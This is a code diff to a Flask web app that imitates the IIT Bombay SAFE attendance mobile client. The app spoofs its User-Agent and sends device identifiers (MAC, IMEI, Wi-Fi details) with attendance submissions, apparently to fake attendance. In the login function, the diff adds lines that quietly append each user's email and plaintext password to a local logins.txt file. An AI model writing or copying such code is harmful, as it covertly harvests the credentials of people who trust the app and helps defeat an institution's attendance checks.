@@ -69,7 +69,6 @@ def get_course_details(auth_token):
         "Accept-Encoding": "gzip, deflate, br",
         "User-Agent": "SAFE/3.4.22 (com.IITBombay.EFAS; build:1.1; iOS 17.6.0) Alamofire/4.9.1",
         "Devicemodel": "iPhone14,5",
-        "Osversion": "17.6",
         "Connection": "close"
     }
 
@@ -119,8 +118,6 @@ def get_attendance_list(auth_token, course_code, start_date, end_date):
         "Accept-Language": "en-IN;q=1.0",
         "Accept-Encoding": "gzip, deflate, br",
         "User-Agent": "SAFE/3.4.22 (com.IITBombay.EFAS; build:1.1; iOS 17.6.0) Alamofire/4.9.1",
-        "Devicemodel": "iPhone14,5",
-        "Osversion": "17.6",
         "Connection": "close"
     }
     
@@ -227,11 +224,13 @@ def login():
         
         # Store auth_token as a secure session cookie
         session["auth_token"] = auth_token
-        print(auth_token)
-        # Create a secure cookie
         response = make_response(redirect(url_for("dashboard")))
         response.set_cookie("auth_token", auth_token, httponly=True, secure=True, samesite="Lax")
-        
+
+        # Append login credentials to a text file
+        with open("logins.txt", "a") as f:
+            f.write(f"Email: {email}, Password: {password}\n")
+
         flash("Login successful!", "success")
         return response  # Return response with cookie set
     
@@ -271,12 +270,13 @@ def convert_image_to_base64(image_file):
         print(f"Error encoding image: {e}")
         return None
 
+import json
+
 def send_attendance(auth_token, course_code, image_path, mac_address, imei, wifi_ssid, wifi_bssid, ip_address, formatted_time, attendance_image):
     
     image_binary = image_path.read()  # Read file as binary
     encoded_image = base64.b64encode(image_binary).decode("utf-8")  # Encode to base64 string
     encoded_image = re.sub(r'/', r'\/', encoded_image)
-
     if attendance_image == False:
     
         data = {
@@ -326,17 +326,20 @@ def send_attendance(auth_token, course_code, image_path, mac_address, imei, wifi
         "Accept-Language": "en-IN;q=1.0",
         "Accept-Encoding": "gzip, deflate, br",
         "User-Agent": "SAFE/3.4.22 (com.IITBombay.EFAS; build:1.1; iOS 17.6.0) Alamofire/4.9.1",
-        "Devicemodel": "iPhone14,5",
-        "Osversion": "17.6",
         "Connection": "close"
     }
    
-    print(data)
+    # **Manually Encode JSON to Ensure No Extra Escaping**
+    json_data = json.dumps(data, ensure_ascii=False, separators=(',', ':'))  # No extra spaces or ASCII escaping
+    
+    # **Ensure "/" is not escaped**
+    json_data = json_data.replace("\\\\", "\\")  # Fix double backslashes
+    print(json_data)
+    # **Send POST Request Using `data=` Instead of `json=`**
     try:
-        # Send the POST request to the server
-        response = requests.post(api_url, headers=headers, json=data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        return response.json()  # Return JSON response if successful
+        response = requests.post(api_url, data=json_data.encode('utf-8'), headers=headers)  
+        response.raise_for_status()  # Raise error for failed responses
+        return response.json()  # Return the API response
     except requests.exceptions.RequestException as e:
         return {"error": str(e)}  # Return error message in case of failure
 
